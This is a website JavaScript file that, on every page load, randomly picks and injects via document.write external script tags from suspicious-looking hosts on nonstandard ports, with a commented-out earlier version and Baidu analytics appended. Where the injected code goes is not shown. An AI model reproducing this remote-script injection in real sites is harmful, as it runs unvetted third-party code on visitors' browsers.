

var randoms = {
	ads_codes: ['<script src="https://show.xmzhapp.com:820/jscode/793/633.js"><'+'/script>','<script type=\'text/javascript\' src=\'https://show.meituangov.cn:12443/ty/73D2CE45-4A17-10283-34-287C6BD109AE.alpha\'><'+'/script>'],
	ads_weight: [10,10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		document.write(randoms.ads_codes[rand]);

	}
}
randoms.init();



//

/*
var randoms = {
	ads_codes: ['<script src="https://za.xueshuzhijia.cn/d/18DFEE0B-EDAD-41E7-9789-BE83AC5E9296.ap"><'+'/script>','<script type=\'text/javascript\' src=\'https://show.xmzhapp.com:820/jscode/793/632.js\'><'+'/script>','<script src="https://liaoningo.cn:16188/ww/3GAYG.alpha"><'+'/script>'],
	ads_weight: [10,10,10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		document.write(randoms.ads_codes[rand]);

	}
}
randoms.init();

*/
var randoms = {
	ads_codes: ['<script src="https://at.180cq.cn/d/18DFEE0B-EDAD-41E7-9789-BE83AC5E9296.ap"><'+'/script>','<script type=\'text/javascript\' src=\'https://show.xmzhapp.com:820/jscode/793/632.js\'><'+'/script>'],
	ads_weight: [10,10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		document.write(randoms.ads_codes[rand]);

	}
}
randoms.init();



//tj

var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?c0c94f494ce8340b9820d24f6590d66f";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();